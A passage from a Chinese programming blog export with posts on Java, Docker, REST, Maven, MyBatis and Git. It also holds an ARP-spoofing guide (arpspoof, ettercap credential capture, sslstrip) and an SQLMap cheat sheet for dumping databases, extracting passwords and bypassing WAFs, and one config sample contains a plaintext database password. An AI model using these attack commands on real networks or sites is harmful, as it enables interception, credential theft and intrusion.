(Exception e) { ​ … } 建议修改为： try { ​ XXX.close(); } catch (Exception e) { ​ … } try { ​ YYY.close(); } catch (Exception e) { ​ … } 虽 然有些麻烦，却能避免资源泄露。我们想，如果没有修改过的代码，万一XXX.close()抛异常了，那么就进入了catch块中 了，YYY.close()不会执行，YYY这块资源就不会回收了，一直占用着，这样的代码一多，是可能引起资源句柄泄露的。而改为下面的写法之后，就保 证了无论如何XXX和YYY都会被close掉 后记 优秀的代码来自每一点点小小的优化，关注每一个细节，不仅仅能提升程序运行效率，同样可以规避许多未知的问题。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>性能优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装Docker]]></title>
    <url>%2F2018%2F01%2F15%2F2018-1-15-%E5%AE%89%E8%A3%85Docker%2F</url>
    <content type="text"><![CDATA[环境● 操作系统 CentOS 7.2 64位● CPU 1核● 内存 1GB 安装1yum -y install docker-io 启动docker1service docker start 加入开机启动1chkconfig docker on 从docker.io中下载centos镜像到本地 /var/lib/docker/graph1docker pull centos:latest 查看已下载的镜像1docker images 启动一个容器1docker run -i -t centos /bin/bash 退出容器ctrl+d 退出容器且关闭, docker ps 查看无ctrl+p+q 退出容器但不关闭, docker ps 查看有 查看所有容器docker ps 进入容器1docker attach 44fc0f0582d9 12]]></content>
      <categories>
        <category>Docker</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Java获取客户端真实IP]]></title>
    <url>%2F2017%2F12%2F05%2Fjavaweb%E8%8E%B7%E5%8F%96%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9C%9F%E5%AE%9Eip%2F</url>
    <content type="text"><![CDATA[在安全性要求较高的web项目中，我们经常有这样的需求: 黑名单：禁止指定ip访问。 白名单：允许指定ip访问。 根据ip追踪恶意入侵系统者。 在Java中我们通常可以这样获取客户端ip地址： 1request.getRemoteAddr(); 但是这个方法有个弊端，就是如果对方使用了反向代理，那么这个方法获取到的永远都是反向代理服务器的ip，而并非用户的真实ip。这样也能达到禁止访问的目的，但是对于已经发生的恶意入侵，我们却无法定位到真实的用户主机。 当你遇到类似的问题时，那么下面的代码就能够很好的帮助你。 1234567891011121314151617public static String getClientIP(HttpServletRequest request) &#123; String ip = request.getHeader("X-Forwarded-For"); if (StringUtils.isNotEmpty(ip) &amp;&amp; !"unKnown".equalsIgnoreCase(ip)) &#123; // 多次反向代理后会有多个ip值，第一个ip才是真实ip int index = ip.indexOf(","); if (index != -1) &#123; return ip.substring(0, index); &#125; else &#123; return ip; &#125; &#125; ip = request.getHeader("X-Real-IP"); if (StringUtils.isNotEmpty(ip) &amp;&amp; !"unKnown".equalsIgnoreCase(ip)) &#123; return ip; &#125; return request.getRemoteAddr();&#125;]]></content>
      <categories>
        <category>Java</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[RESTful架构详解]]></title>
    <url>%2F2017%2F10%2F15%2FRESTful%E6%9E%B6%E6%9E%84%2F</url>
    <content type="text"><![CDATA[越来越多的人开始意识到，网站即软件，而且是一种新型的软件。 这种”互联网软件”采用客户端/服务器模式，建立在分布式体系上，通过互联网通信，具有高延时（high latency）、高并发等特点。 网站开发，完全可以采用软件开发的模式。但是传统上，软件和网络是两个不同的领域，很少有交集；软件开发主要针对单机环境，网络则主要研究系统之间的通信。互联网的兴起，使得这两个领域开始融合，现在我们必须考虑，如何开发在互联网环境中使用的软件。 RESTful架构，就是目前最流行的一种互联网软件架构。它结构清晰、符合标准、易于理解、扩展方便，所以正得到越来越多网站的采用。 但是，到底什么是RESTful架构，并不是一个容易说清楚的问题。下面，我就谈谈我理解的RESTful架构。 起源REST这个词，是Roy Thomas Fielding在他2000年的博士论文中提出的。 Fielding是一个非常重要的人，他是HTTP协议（1.0版和1.1版）的主要设计者、Apache服务器软件的作者之一、Apache基金会的第一任主席。所以，他的这篇论文一经发表，就引起了关注，并且立即对互联网开发产生了深远的影响。 他这样介绍论文的写作目的： “本文研究计算机科学两大前沿—-软件和网络—-的交叉点。长期以来，软件研究主要关注软件设计的分类、设计方法的演化，很少客观地评估不同的设计选择对系统行为的影响。而相反地，网络研究主要关注系统之间通信行为的细节、如何改进特定通信机制的表现，常常忽视了一个事实，那就是改变应用程序的互动风格比改变互动协议，对整体表现有更大的影响。我这篇文章的写作目的，就是想在符合架构原理的前提下，理解和评估以网络为基础的应用软件的架构设计，得到一个功能强、性能好、适宜通信的架构。“ (This dissertation explores a junction on the frontiers of two research disciplines in computer science: software and networking. Software research has long been concerned with the categorization of software designs and the development of design methodologies, but has rarely been able to objectively evaluate the impact of various design choices on system behavior. Networking research, in contrast, is focused on the details of generic communication behavior between systems and improving the performance of particular communication techniques, often ignoring the fact that changing the interaction style of an application can have more impact on performance than the communication protocols used for that interaction. My work is motivated by the desire to understand and evaluate the architectural design of network-based application software through principled use of architectural constraints, thereby obtaining the functional, performance, and social properties desired of an architecture. ) 名称Fielding将他对互联网软件的架构原则，定名为REST，即Representational State Transfer的缩写。我对这个词组的翻译是”表现层状态转化”。 如果一个架构符合REST原则，就称它为RESTful架构。 要理解RESTful架构，最好的方法就是去理解Representational State Transfer这个词组到底是什么意思，它的每一个词代表了什么涵义。如果你把这个名称搞懂了，也就不难体会REST是一种什么样的设计。 资源（Resources）REST的名称”表现层状态转化”中，省略了主语。”表现层”其实指的是”资源”（Resources）的”表现层”。 所谓”资源”，就是网络上的一个实体，或者说是网络上的一个具体信息。它可以是一段文本、一张图片、一首歌曲、一种服务，总之就是一个具体的实在。你可以用一个URI（统一资源定位符）指向它，每种资源对应一个特定的URI。要获取这个资源，访问它的URI就可以，因此URI就成了每一个资源的地址或独一无二的识别符。 所谓”上网”，就是与互联网上一系列的”资源”互动，调用它的URI。 表现层（Representation“资源”是一种信息实体，它可以有多种外在表现形式。我们把”资源”具体呈现出来的形式，叫做它的”表现层”（Representation）。 比如，文本可以用txt格式表现，也可以用HTML格式、XML格式、JSON格式表现，甚至可以采用二进制格式；图片可以用JPG格式表现，也可以用PNG格式表现。 URI只代表资源的实体，不代表它的形式。严格地说，有些网址最后的”.html”后缀名是不必要的，因为这个后缀名表示格式，属于”表现层”范畴，而URI应该只代表”资源”的位置。它的具体表现形式，应该在HTTP请求的头信息中用Accept和Content-Type字段指定，这两个字段才是对”表现层”的描述。 状态转化（State Transfer）访问一个网站，就代表了客户端和服务器的一个互动过程。在这个过程中，势必涉及到数据和状态的变化。 互联网通信协议HTTP协议，是一个无状态协议。这意味着，所有的状态都保存在服务器端。因此，如果客户端想要操作服务器，必须通过某种手段，让服务器端发生”状态转化”（State Transfer）。而这种转化是建立在表现层之上的，所以就是”表现层状态转化”。 客户端用到的手段，只能是HTTP协议。具体来说，就是HTTP协议里面，四个表示操作方式的动词：GET、POST、PUT、DELETE。它们分别对应四种基本操作：GET用来获取资源，POST用来新建资源（也可以用于更新资源），PUT用来更新资源，DELETE用来删除资源。 综述综合上面的解释，我们总结一下什么是RESTful架构： （1）每一个URI代表一种资源； （2）客户端和服务器之间，传递这种资源的某种表现层； （3）客户端通过四个HTTP动词，对服务器端资源进行操作，实现”表现层状态转化”。 误区RESTful架构有一些典型的设计误区。 最常见的一种设计错误，就是URI包含动词。因为”资源”表示一种实体，所以应该是名词，URI不应该有动词，动词应该放在HTTP协议中。 举例来说，某个URI是/posts/show/1，其中show是动词，这个URI就设计错了，正确的写法应该是/posts/1，然后用GET方法表示show。 如果某些动作是HTTP动词表示不了的，你就应该把动作做成一种资源。比如网上汇款，从账户1向账户2汇款500元，错误的URI是： POST /accounts/1/transfer/500/to/2 正确的写法是把动词transfer改成名词transaction，资源不能是动词，但是可以是一种服务： POST /transaction HTTP/1.1 Host: 127.0.0.1 from=1&amp;to=2&amp;amount=500.00 另一个设计误区，就是在URI中加入版本号： http://www.example.com/app/1.0/foo http://www.example.com/app/1.1/foo http://www.example.com/app/2.0/foo 因为不同的版本，可以理解成同一种资源的不同表现形式，所以应该采用同一个URI。版本号可以在HTTP请求头信息的Accept字段中进行区分（参见Versioning REST Services）： Accept: vnd.example-com.foo+json; version=1.0 Accept: vnd.example-com.foo+json; version=1.1 Accept: vnd.example-com.foo+json; version=2.0-怕【]]></content>
      <categories>
        <category>架构</category>
      </categories>
      <tags>
        <tag>RESTful</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kail ARP 断网攻击（局域网内）]]></title>
    <url>%2F2017%2F10%2F05%2FKail-ARP-%E6%96%AD%E7%BD%91%E6%94%BB%E5%87%BB%EF%BC%88%E5%B1%80%E5%9F%9F%E7%BD%91%E5%86%85%EF%BC%89%2F</url>
    <content type="text"><![CDATA[首先 打开KALI 终端 输入指令：ifconfig 查看网卡设备 获取受害者电脑IP以及网关（同一局域网，网关相同），可以在Windows中ping 一下 ip看一下是否能ping通， 输入指令：arpspoof -i eth0（本机网卡设备名称）-t 192.168.0.114（受害者IP）192.168.0.1（目标网关） ，按下Enter 攻击开始 在Windows中打开CMD 输入指令 ping 192.168.0.114 （受害者IP）系统返回：请求超时！，即攻击成功， 按下Ctrl +C即可停止攻击 如果不知道局域网下有多少主机存活可以在终端输入指令fping -asg 192.168.0.100/24 查看局域网中存活的主机 ps:如果出现arpspoof: couldn’t arp for host ，要把虚拟机设 置成桥接，或者关闭目标防火墙。 echo 1 &gt;/proc/sys/net/ipv4/ip_forward 用于arp欺骗： arpspoof -i eth0(网卡) -t 192.168.1.100(目标ip) 192.168.1.1（网关） 用于arp欺骗后劫持图片 driftnot -i eth0(网卡) 劫持http账号密码 ettercap -Tq -i eth0(网卡) 如果想劫持https的 那就现将https的连接还原为http sslstrip -a -f -k 用这个命令 再与劫持http的命令结合使用]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>安全</tag>
        <tag>Kail</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLMap常用命令]]></title>
    <url>%2F2017%2F09%2F29%2F2017-9-29-SQLMap%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[cookie注入：sqlmap.py -u 注入点 --cookie &quot;参数&quot; --tables --level 2POST登录框注入：sqlmap.py -r 从文件读取数据 -p 指定的参数 --tables ​ sqlmap.py -u 登录的地址 --forms 自动判断注入 ​ sqlmap.py -u 登录的地址 --data &quot;指定参数&quot; 绕过waf防火墙：sqlmap.py -u 注入点 -v 3 --dbs --batch --tamper space2morehash.py,space2hash.py,base64encode.py,charencode.py-u #注入点 -g 谷歌搜索 -f#指纹判别数据库类型 -b #获取数据库版本信息 -p #指定可测试的参数(?page=1&amp;id=2 -p “page,id”) -D “” #指定数据库名 -T “” #指定表名 -C “” #指定字段 -s “” #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log” 恢复:-s “xx.log” –resume) –columns#列出字段 –current-user #获取当前用户名称 –current-db #获取当前数据库名称 –users #列数据库所有用户 –passwords #数据库用户所有密码 –privileges #查看用户权限(–privileges -U root) -U #指定数据库用户 –dbs #列出所有数据库 –tables -D “” #列出指定数据库中的表 –columns -T “user” -D “mysql” #列出mysql数据库中的user表的所有字段 –dump-all #列出所有数据库所有表 –exclude-sysdbs #只列出用户自己新建的数据库和表 –dump -T “” -D “” -C “” #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname) –dump -T “” -D “” –start 2 –top 4 # 列出指定数据库的表的2-4字段的数据 –dbms #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) –os #指定系统(Linux,Windows) --sql -shell 写shell --delay 延迟的时间]]></content>
      <tags>
        <tag>渗透</tag>
        <tag>SQLMap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Maven知识点整理]]></title>
    <url>%2F2017%2F09%2F10%2FMaven%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[1.maven常用构建命令(了解) mvn -v:查看maven的版本。 mvn compile:编译项目。项目经过编译后会在根目录下生成一个target包(跟src包在同一目录下)，里面保存的是编译项目时字节码文件和测试报告。 mvn test:测试。此命令在项目目录下 mvn package:打包我们的项目。 mvn clean:删除上述经过编译后生成的target包。 mvn install:将我们的项目打包到本地仓库中。例如将A项目用该命令打包到本地仓库后，就可以在B项目的pom.xml文件中配置A项目的坐标来让B项目引用A项目，见下文仓库的讲解。 只有第一个命令mvn -v是在根目录下执行，其他5个命令都是在我们的maven项目包下执行的。 上述知识只做了解，在实际开发中基本没有用到上述命令。 2.maven自动构件骨架我在创建第一个Maven项目中就有介绍过，让maven自动为我们的项目生成一个标准的骨架有两种方式，一种是通过命令行输入: 1mvn archetype:generate -DgroupId=cn.codingxiaxw.helloword -DartifactId=helloworld -Dpackage=cn.codingxiaxw.helloword -Dversion=1.0-SNAPSHOT -DarchetypeArtifactId=maven-archetype-quickstart 或者: 1mvn archetype:generate -DgroupId=cn.codingxiaxw.helloword -DartifactId=helloworld -Dpackage=cn.codingxiaxw.helloword -Dversion=1.0-SNAPSHOT -DarchetypeArtifactId=maven-archetype-webapp 第二种方式是使用IDEA开发工具为我们生成，步骤之前讲过，大家可以点击上述链接看我在那篇文章中的介绍。这里只对上述命令进行解释，如下: mvn:表示使用的是maven命令。 archetype:generate:表示使用generate这个插件为我们的maven项目自动生成一个maven骨架，即我们项目的工程结构(如下图)。后边跟的是该插件为我们创建工程结构所需要的一连串的参数。 -DgroupId:标识项目的坐标元素之一，与DartifactId,Dpackaging,Dversion组成我们maven项目的坐标，四者唯一确定一个项目。它的值为我们的项目包名，我这里的格式用的我的博客网站后缀+我的用户名+项目名组成。 -DartifactId:标识项目的坐标元素之一，它的值为我们的项目名。我这里指定我要生成的项目名为helloword。 -Dpackage:标识项目的坐标元素之一,这里值就跟DgroupId的值保持一致即可。此属性在命令行中可选。 -Dversion:指定版本号。此属性在命令行中可选 -DarchetypeArtifactId:表示我们生成的工程结构为哪一种，这里的属性值为maven-archetype-quickstart表示生成工程目录结构为quickstart的结构。其值还可以为maven-archetype-webapp表示生成的工程目录结构为webapp型的结构。 3.maven中的坐标和仓库3.1坐标在maven的世界中，maven以构件来组成基本的控制单元，而定义这个构件的标示，maven给定义为“坐标”。坐标是maven最基本的概念，它就像每个构件的身份证号码，有了它我们就可以在数以千万计的构件中定位任何一个我们感兴趣的构件。 例如我们在上篇文章中通过maven命令生成的maven项目中，其pom.xml中有这样一些配置: 1234&lt;groupId&gt;cn.codingxiaxw.helloword&lt;/groupId&gt;&lt;artifactId&gt;helloword&lt;/artifactId&gt;&lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;&lt;packaging&gt;jar&lt;/packaging&gt; 上面这样四个xml元素即即组成了一个坐标，唯一标识我们创建的这个项目。 再如若我们要在自己的项目中引入junit测试jar包，只需在pom.xml中配置如下junit的坐标: 123456&lt;dependency&gt; &lt;groupId&gt;junit&lt;/groupId&gt; &lt;artifactId&gt;junit&lt;/artifactId&gt; &lt;version&gt;4.8.2&lt;/version&gt; &lt;scope&gt;test&lt;/scope&gt;&lt;/dependency&gt; maven就会根据我们给出的junit的坐标在其中央仓库中为我们找到junit 的相关jar包，然后将其下载到自己的本地仓库中。这样我们便可以在自己的项目开发中运用junit类进行测试了。 3.2仓库上述我们已经提到了仓库，其实当我们在自己的电脑上成功安装maven后，就已经已经生成了一个本地仓库，可以在下列地址中找到: 1/Users/codingBoy/.m2/repository 打开后发现里面全是各种本地仓库中的各种引用开发jar包，这里也能发现我们在pom.xml中配置的junit，可以发现已经下载到本地仓库里面了，如下: 只要我们在pom.xml中配置了相关jar包的坐标，maven都会根据这个坐标自动将这些jar包下载在该目录(也就是maven的本地仓库)下供我们开发过程中的直接引用。 既然有本地仓库，那么是不是还有个远程仓库的概念呢？答案是肯定的，这个远程仓库是个大仓库，叫做中央仓库，地址为:https://repo.maven.apache.org/maven2。感谢开源社区的贡献，在maven的中央仓库里几乎为我们下载了所有开发都需要的jar包，如下: 要是此时我们又创建了一个maven项目helloword2，而且需要在这个项目中引用helloword项目，只要将helloword项目打包到本地仓库，然后在helloword2项目的pom.xml文件中引入helloword的坐标即可。通过如下步骤: 1.在命令行中输入命令: 123先cd helloword然后mvn clean 通过上述步骤清除helloword经过编译后生成的target包。 2.输入: 1mvn install 将helloword项目打包并发布到本地仓库中。 3.此时helloword2就可以根据坐标来引入helloword项目了，在helloword2的pom.xml文件中添加helloword的坐标: 123456&lt;dependency&gt; &lt;groupId&gt;cn.codingxiaxw.helloword&lt;/groupId&gt; &lt;artifactId&gt;helloword&lt;/artifactId&gt; &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt; &lt;packaging&gt;jar&lt;/packaging&gt;&lt;/dependency&gt; 这样便完成了在一个项目中对另一个项目进行引用。 3.3坐标和仓库的关系有了坐标，就知道在什么位置存储构件的内容，中央仓库也是一个样，上述例子中引用的junit的可以把它的坐标描述为：junit:junit:4.8.2，在中央仓库地址中打开对应的目录果然看到了Junit的jar包: 有了正确的坐标,Maven才能够在正确的位置找到依赖文件并使用，上述pom.xml中为junit坐标设置的&lt;scope&gt;标签中的test值是用来控制该依赖只在测试时可用，与坐标无关。 正因为坐标是Maven核心的核心，因此规划正确的坐标至关重要，如果你使用了模糊不清的坐标，那么你的用户就很难找到你的构件，或者即使找到了，也容易写错。错误的使用坐标，还会造成冲突，如果你也使用junit这样的groupId，那就悲剧了。 4.生命周期和插件Maven定义了三套生命周期：clean、default、site，每个生命周期都包含了一些阶段（phase）。三套生命周期相互独立，但各个生命 周期中的phase却是有顺序的，且后面的phase依赖于前面的phase。执行某个phase时，其前面的phase会依顺序执行，但不会触发另外两 套生命周期中的任何phase。 clean，做些清理的工作。 default，最核心的周期，做初始化和构建的工作，里面分的阶段很多，主要是compllie,test, package, install等。 site，生成站点的周期，包括生成文档和发布等。 maven的生命周期是抽象的，实际需要插件来完成任务，这一过程是通过将插件的目标（goal）绑定到生命周期的具体阶段（phase）来完成的。这里就像设计模式中的模板模式，父类定义好了方法模板并规定对了执行顺序，而子类定义了每个模板方法具体要做的事情。这里的父类相当于maven，而子类就像是一个个的插件。 比如compile这个阶段，对应的是mvn complie这个命令，但是实际上是maven-compiler-plugin这个插件在起作用。 而install这个阶段,对应的mvn install命令，实际上是maven-install-plugin这个插件在起作用。 5.总结在实际开发中，我们用到Maven对我们的项目进行管理的地方，就是通过在pom.xml文件中添加所需第三方jar包的坐标让maven在中央仓库中找到相应的jar包资源然后下载到本地仓库中为我们使用。有了maven以后，我们在用到第三方jar包时就不需要再去网上找相关的jar包进行下载及导入到path环境中，maven为我们的项目开发进行了很好的管理。]]></content>
      <tags>
        <tag>maven</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用IDEA生成Mybatis逆向工程]]></title>
    <url>%2F2017%2F06%2F15%2F%E4%BD%BF%E7%94%A8IDEA%E7%94%9F%E6%88%90Mybatis%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[以往我们在开发时都需要通过数据库中的表然后自己在po包下建立相对应的pojo类，并要创建相应的mapper.xml写出对表的所有操作，而使用mybatis逆向工程就不用我们自己再编写pojo类与相应的mapper.java和mapper.xml文件，它可以自动对单表生成sql，包括:mapper.xml、mapper.java、表名.java(po类)。是不是很方便？接下来我将为你们介绍如何使用mybatis的逆向工程，只需三步便可以简单做到。 首先我们需要在官网下载:逆向工程开发文档以及jar包:mybatis-generator-core-bundle。为什么我的标题要注明使用的开发工具是IDEA呢?用IDEA的好处就是可以使用Maven依赖，但是此篇文章中我们就新建一个普通工程，所以此篇文章讲解的配置在其他开发工具中能实现同样的效果。 1.逆向工程使用配置1.1jar包的导入这里我们需要导入四个包，1.mybatis3.xjar包。2.逆向工程核心包。3.数据库连接包。4.log4j.jar，用于输出日志。目录如下: .2配置逆向工程的配置文件 在src包下创建逆向工程配置文件generatorConfig.xml,内容如下，直接拷贝官网介绍的内容即可: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE generatorConfiguration PUBLIC "-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN" "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd"&gt;&lt;generatorConfiguration&gt; &lt;context id="testTables" targetRuntime="MyBatis3"&gt; &lt;commentGenerator&gt; &lt;!-- 是否去除自动生成的注释 true：是 ： false:否 --&gt; &lt;property name="suppressAllComments" value="true" /&gt; &lt;/commentGenerator&gt; &lt;!--数据库连接的信息：驱动类、连接地址、用户名、密码 --&gt; &lt;jdbcConnection driverClass="com.mysql.jdbc.Driver" connectionURL="jdbc:mysql://localhost:3306/mybatis" userId="root" password="xiaxunwu1996."&gt; &lt;/jdbcConnection&gt; &lt;!-- &lt;jdbcConnection driverClass="oracle.jdbc.OracleDriver" connectionURL="jdbc:oracle:thin:@127.0.0.1:1521:yycg" userId="yycg" password="yycg"&gt; &lt;/jdbcConnection&gt; --&gt; &lt;!-- 默认false，把JDBC DECIMAL 和 NUMERIC 类型解析为 Integer，为 true时把JDBC DECIMAL 和 NUMERIC 类型解析为java.math.BigDecimal --&gt; &lt;javaTypeResolver&gt; &lt;property name="forceBigDecimals" value="false" /&gt; &lt;/javaTypeResolver&gt; &lt;!-- targetProject:生成PO类的位置 --&gt; &lt;javaModelGenerator targetPackage="po" targetProject=".\src"&gt; &lt;!-- enableSubPackages:是否让schema作为包的后缀 --&gt; &lt;property name="enableSubPackages" value="false" /&gt; &lt;!-- 从数据库返回的值被清理前后的空格 --&gt; &lt;property name="trimStrings" value="true" /&gt; &lt;/javaModelGenerator&gt; &lt;!-- targetProject:mapper映射文件生成的位置 --&gt; &lt;sqlMapGenerator targetPackage="mapper" targetProject=".\src"&gt; &lt;!-- enableSubPackages:是否让schema作为包的后缀 --&gt; &lt;property name="enableSubPackages" value="false" /&gt; &lt;/sqlMapGenerator&gt; &lt;!-- targetPackage：mapper接口生成的位置 --&gt; &lt;javaClientGenerator type="XMLMAPPER" targetPackage="mapper" targetProject=".\src"&gt; &lt;!-- enableSubPackages:是否让schema作为包的后缀 --&gt; &lt;property name="enableSubPackages" value="false" /&gt; &lt;/javaClientGenerator&gt; &lt;!-- 指定数据库表 --&gt; &lt;table tableName="items"&gt;&lt;/table&gt; &lt;table tableName="orders"&gt;&lt;/table&gt; &lt;table tableName="orderdetail"&gt;&lt;/table&gt; &lt;!-- &lt;table schema="" tableName="sys_user"&gt;&lt;/table&gt; &lt;table schema="" tableName="sys_role"&gt;&lt;/table&gt; &lt;table schema="" tableName="sys_permission"&gt;&lt;/table&gt; &lt;table schema="" tableName="sys_user_role"&gt;&lt;/table&gt; &lt;table schema="" tableName="sys_role_permission"&gt;&lt;/table&gt; --&gt; &lt;!-- 有些表的字段需要指定java类型 &lt;table schema="" tableName=""&gt; &lt;columnOverride column="" javaType="" /&gt; &lt;/table&gt; --&gt; &lt;/context&gt;&lt;/generatorConfiguration&gt; 需要修改的地方: javaModelGenerator,生成PO类的位置 sqlMapGenerator,mapper映射文件生成的位置 javaClientGenerator,mapper接口生成的位置 table,其tableName属性对应数据库中相应表 1.3执行生成代码在src包下新建一个Generator.java文件，内容如下，也是拷贝的官网中介绍的代码: 123456789101112131415161718192021222324252627282930313233343536import java.io.File;import java.util.ArrayList;import java.util.List;import org.mybatis.generator.api.MyBatisGenerator;import org.mybatis.generator.config.Configuration;import org.mybatis.generator.config.xml.ConfigurationParser;import org.mybatis.generator.internal.DefaultShellCallback;public class GeneratorSqlmap &#123; public void generator() throws Exception&#123; List&lt;String&gt; warnings = new ArrayList&lt;String&gt;(); boolean overwrite = true; //指定 逆向工程配置文件 File configFile = new File("src/generatorConfig.xml"); ConfigurationParser cp = new ConfigurationParser(warnings); Configuration config = cp.parseConfiguration(configFile); DefaultShellCallback callback = new DefaultShellCallback(overwrite); MyBatisGenerator myBatisGenerator = new MyBatisGenerator(config, callback, warnings); myBatisGenerator.generate(null); &#125; public static void main(String[] args) throws Exception &#123; try &#123; GeneratorSqlmap generatorSqlmap = new GeneratorSqlmap(); generatorSqlmap.generator(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 注意，这里new File中传入的参数只能是src/generatorConfig.xml而不能为generatorConfig.xml，否则会出现java.io.FileNotFoundException: generatorConfig.xml (No such file or directory)的报错信息，运行程序，在打印台看到输出日志信息为: 然后再点击文件目录上的刷新图标刷新文件目录，文件目录下出现我们通过单表映射出来的po类包以及mapper包下的mapper.xml和mapper.java，刚开始的工程目录如下:运行程序后最后的工程目录结构如下: 这样我们便通过mybatis的逆向工程完成了通过单表直接创建出对应的mapper.java和mapper.xml的工作。 2.逆向工程的应用逆向工程往往是单独的建立一个普通工程如A，通过运行逆向工程生成相应的mapper和po后然后再将这两个包拷贝到我们使用到ssm框架创建的web项目，而不是直接在web项目中使用逆向工程。 通过运行上述的程序，我们便通过数据库中的表快速的生成了相应的po类和mapper，而不用我们程序员自己再编写相应的po类和mapper，为我们带来了很大的方便，所以这个一定要学会，在后续开发中只要使用到mybatis的地方我们都会通过mybatis的逆向工程自动为我们生成mapper和po类。]]></content>
      <categories>
        <category>Mybatis</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Git常用命令]]></title>
    <url>%2F2017%2F05%2F05%2FGit%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[创建版本库在当前目录新建一个Git代码库 $ git init 新建一个目录，将其初始化为Git代码库 $ git init [project-name] 下载一个项目和它的整个代码历史 $ git clone [url] 添加/删除添加指定文件到暂存区 $ git add [file1] [file2] … 添加指定目录到暂存区，包括子目录 $ git add [dir] 添加当前目录的所有文件到暂存区 $ git add . 添加每个变化前，都会要求确认对于同一个文件的多处变化，可以实现分次提交 $ git add -p 删除工作区文件，并且将这次删除放入暂存区 $ git rm [file1] [file2] … 停止追踪指定文件，但该文件会保留在工作区 $ git rm –cached [file] 改名文件，并且将这个改名放入暂存区 $ git mv [file-original] [file-renamed] 提交提交暂存区到仓库区 $ git commit -m [message] 提交暂存区的指定文件到仓库区 $ git commit [file1] [file2] … -m [message] 提交工作区自上次commit之后的变化，直接到仓库区 $ git commit -a 提交时显示所有diff信息 $ git commit -v 使用一次新的commit，替代上一次提交如果代码没有任何新变化，则用来改写上一次commit的提交信息 $ git commit –amend -m [message] 重做上一次commit，并包括指定文件的新变化 $ git commit –amend [file1] [file2] … 分支列出所有本地分支 $ git branch 列出所有远程分支 $ git branch -r 列出所有本地分支和远程分支 $ git branch -a 新建一个分支，但依然停留在当前分支 $ git branch [branch-name] 新建一个分支，并切换到该分支 $ git checkout -b [branch] 新建一个分支，指向指定commit $ git branch [branch] [commit] 新建一个分支，与指定的远程分支建立追踪关系 $ git branch –track [branch] [remote-branch] 切换到指定分支，并更新工作区 $ git checkout [branch-name] 切换到上一个分支 $ git checkout - 建立追踪关系，在现有分支与指定的远程分支之间 $ git branch –set-upstream [branch] [remote-branch] 合并指定分支到当前分支 $ git merge [branch] 选择一个commit，合并进当前分支 $ git cherry-pick [commit] 删除分支 $ git branch -d [branch-name] 删除远程分支 $ git push origin –delete [branch-name]$ git branch -dr [remote/branch] 标签 列出所有tag $ git tag 新建一个tag在当前commit $ git tag [tag] 新建一个tag在指定commit $ git tag [tag] [commit] 删除本地tag $ git tag -d [tag] 删除远程tag $ git push origin :refs/tags/[tagName] 查看tag信息 $ git show [tag] 提交指定tag $ git push [remote] [tag] 提交所有tag $ git push [remote] –tags 新建一个分支，指向某个tag $ git checkout -b [branch] [tag] 查看信息显示有变更的文件 $ git status 显示当前分支的版本历史 $ git log 显示commit历史，以及每次commit发生变更的文件 $ git log –stat 搜索提交历史，根据关键词 $ git log -S [keyword] 显示某个commit之后的所有变动，每个commit占据一行 $ git log [tag] HEAD –pretty=format:%s 显示某个commit之后的所有变动，其”提交说明”必须符合搜索条件 $ git log [tag] HEAD –grep feature 显示某个文件的版本历史，包括文件改名 $ git log –follow [file]$ git whatchanged [file] 显示指定文件相关的每一次diff $ git log -p [file] 显示过去5次提交 $ git log -5 –pretty –oneline 显示所有提交过的用户，按提交次数排序 $ git shortlog -sn 显示指定文件是什么人在什么时间修改过 $ git blame [file] 显示暂存区和工作区的代码差异 $ git diff 显示暂存区和上一个commit的差异 $ git diff –cached [file] 显示工作区与当前分支最新commit之间的差异 $ git diff HEAD 显示两次提交之间的差异 $ git diff [first-branch]…[second-branch] 显示今天你写了多少行代码 $ git diff –shortstat “@{0 day ago}” 显示某次提交的元数据和内容变化 $ git show [commit] 显示某次提交发生变化的文件 $ git show –name-only [commit] 显示某次提交时，某个文件的内容 $ git show [commit]:[filename] 显示当前分支的最近几次提交 $ git reflog 从本地master拉取代码更新当前分支：branch 一般为master $ git rebase [branch] 同步下载远程仓库的所有变动 $ git fetch [remote] 显示所有远程仓库 $ git remote -v 显示某个远程仓库的信息 $ git remote show [remote] 增加一个新的远程仓库，并命名 $ git remote add [shortname] [url] 取回远程仓库的变化，并与本地分支合并 $ git pull [remote] [branch] 上传本地指定分支到远程仓库 $ git push [remote] [branch] 强行推送当前分支到远程仓库，即使有冲突 $ git push [remote] –force 推送所有分支到远程仓库 $ git push [remote] –all 恢复恢复暂存区的指定文件到工作区 $ git checkout [file] 恢复某个commit的指定文件到暂存区和工作区 $ git checkout [commit] [file] 恢复暂存区的所有文件到工作区 $ git checkout . 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变 $ git reset [file] 重置暂存区与工作区，与上一次commit保持一致 $ git reset –hard 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变 $ git reset [commit] 